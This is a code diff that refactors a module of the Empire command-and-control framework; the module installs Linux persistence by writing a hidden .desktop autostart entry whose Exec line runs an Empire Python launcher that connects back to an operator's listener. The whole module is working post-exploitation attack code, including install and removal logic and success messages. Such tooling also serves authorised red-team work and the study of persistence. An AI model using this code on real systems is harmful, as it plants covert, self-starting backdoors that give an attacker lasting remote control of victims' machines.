@@ -1,103 +1,28 @@
+from __future__ import print_function
+
+from builtins import str
 from builtins import object
+from typing import Dict
+
+from empire.server.common import helpers
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        # metadata info about the module, not modified during runtime
-        self.info = {
-            # name for the module that will appear in module menus
-            'Name': 'DesktopFile',
-
-            # list of one or more authors for the module
-            'Author': ['@jarrodcoulter'],
-
-            # more verbose multi-line description of the module
-            'Description': 'Installs an Empire launcher script in ~/.config/autostart on Linux versions with GUI.',
-
-            'Software': '',
-
-            'Techniques': ['T1165'],
-
-            # True if the module needs to run in the background
-            'Background' : False,
-
-            # File extension to save the file as
-            'OutputExtension' : None,
-
-            # if the module needs administrative privileges
-            'NeedsAdmin' : False,
-
-            # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : False,
-
-            # the module language
-            'Language' : 'python',
-
-            # the minimum language version needed
-            'MinLanguageVersion' : '2.6',
-
-            # list of any references/other comments
-            'Comments': ['https://digitasecurity.com/blog/2018/01/23/crossrat/, https://specifications.freedesktop.org/desktop-entry-spec/latest/ar01s07.html, https://neverbenever.wordpress.com/2015/02/11/how-to-autostart-a-program-in-raspberry-pi-or-linux/']
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description'   :   'Agent to execute module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Remove' : {
-                'Description'   :   'Remove Persistence based on FileName. True/False',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'FileName' : {
-                'Description'   :   'File name without extension that you would like created in ~/.config/autostart/ folder.',
-                'Required'      :   False,
-                'Value'         :   'sec_start'
-            }
-
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        # During instantiation, any settable option parameters
-        #   are passed as an object set to the module and the
-        #   options dictionary is automatically set. This is mostly
-        #   in case options are passed on the command line
-        if params:
-            for param in params:
-                # parameter format is [Name, Value]
-                option, value = param
-                if option in self.options:
-                    self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-        remove = self.options['Remove']['Value']
-        fileName = self.options['FileName']['Value']
-        listenerName = self.options['Listener']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
+        remove = params['Remove']
+        file_name = params['FileName']
+        listener_name = params['Listener']
+        launcher = main_menu.stagers.generate_launcher(listener_name, language='python')
         launcher = launcher.strip('echo').strip(' | python3 &')
-        dtSettings = """
+        dt_settings = """
 [Desktop Entry]
 Name=%s
 Exec=python -c %s
 Type=Application
 NoDisplay=True
-""" % (fileName, launcher)
+""" % (file_name, launcher)
         script = """
 import subprocess
 import sys
@@ -127,6 +52,6 @@ else:
     print("\\n[+] Persistence has been installed: ~/.config/autostart/%s")
     print("\\n[+] Empire daemon has been written to %s")
 
-""" % (remove, dtSettings, fileName, fileName, fileName)
+""" % (remove, dt_settings, file_name, file_name, file_name)
 
         return script
